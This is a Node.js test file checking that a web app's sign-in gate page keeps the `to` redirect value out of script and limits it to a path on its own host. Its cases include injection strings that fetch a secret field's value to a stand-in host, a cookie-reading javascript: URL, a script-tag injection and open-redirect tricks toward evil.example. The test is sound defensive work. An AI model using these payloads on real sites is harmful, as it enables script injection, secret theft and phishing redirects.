// test/gate-page.test.js
// The gate page carries where to go after signing in. That value came from
// the URL, so it must never reach script: it is sanitised to a path on this
// host and handed over in a data attribute that a fixed script reads.
import assert from 'node:assert/strict';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import { createDrive } from '../server/app.js';
import { loadConfig } from '../server/config.js';

// What the browser hands the script from the attribute: decimal and hex
// character references (escapeHtml writes &#39; &#34; &#60; &#62; &#38;) and
// the named ones, decoded in one pass so &#38;#39; stays literal.
const NAMED = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'" };
const decode = (s) => s.replace(/&(?:#(\d+)|#x([0-9a-f]+)|([a-z]+));/gi, (m, dec, hex, name) =>
  dec ? String.fromCodePoint(Number(dec)) : hex ? String.fromCodePoint(parseInt(hex, 16)) : NAMED[name.toLowerCase()] ?? m);


test('the gate page puts no part of `to` into script, and keeps only a path on this host', async (t) => {
  const root = await fsp.mkdtemp(path.join(os.tmpdir(), 'gate-page-'));
  const drive = await createDrive(loadConfig({ MARBLE_DRIVE_ROOT: root, MARBLE_DRIVE_SECRET: 'hunter2' }), { log: { log() {}, error() {}, info() {} }, agents: false });
  t.after(async () => {
    await drive.close();
    await fsp.rm(root, { recursive: true, force: true });
  });
  const port = await new Promise((r) => drive.server.listen(0, '127.0.0.1', () => r(drive.server.address().port)));
  const page = async (to) => (await fetch(`http://127.0.0.1:${port}/gate?to=${encodeURIComponent(to)}`, { headers: { Accept: 'text/html' } })).text();
  const cases = {
    "');fetch('https://x/?'+this.secret.value);('": '/',
    "/');fetch('https://x/?'+this.secret.value);('": null, // a path; it may survive, but only as data
    'javascript:alert(document.cookie)': '/',
    '//evil.example': '/',
    '/\\evil.example': '/',
    '/a/drive?x=1': '/a/drive?x=1',
    '/a/drive?q=a&b="c"': '/a/drive?q=a&b=%22c%22',
    '/.//evil.example/phish': '/',
    '/a/..//evil.example': '/',
    '/%2E%2E//evil.example': '/',
    '/a/../\\evil.example': '/',
    '/"><script>alert(1)</script>': null,
  };
  for (const [to, expected] of Object.entries(cases)) {
    const body = await page(to);
    assert.doesNotMatch(body, /\son[a-z]+=/i, 'no inline event handlers');
    const scripts = [...body.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/g)].map((m) => m[1]).join('\n');
    assert.doesNotMatch(scripts, /fetch\('https:\/\/x|alert|evil|javascript:/, `${to}: nothing of it in script`);
    assert.equal((body.match(/<script/g) ?? []).length, 1, `${to}: one script, the page's own`);
    const data = /data-to="([^"]*)"/.exec(body);
    assert.ok(data, 'the target is in data-to');
    const target = decode(data[1]);
    if (expected !== null) assert.equal(target, expected, to);
    assert.equal(new URL(target, 'http://x').origin, 'http://x', `${to}: stays on this host`);
    assert.ok(!target.startsWith('//') && !target.startsWith('/\\'), `${to}: ${target}`);
  }
});
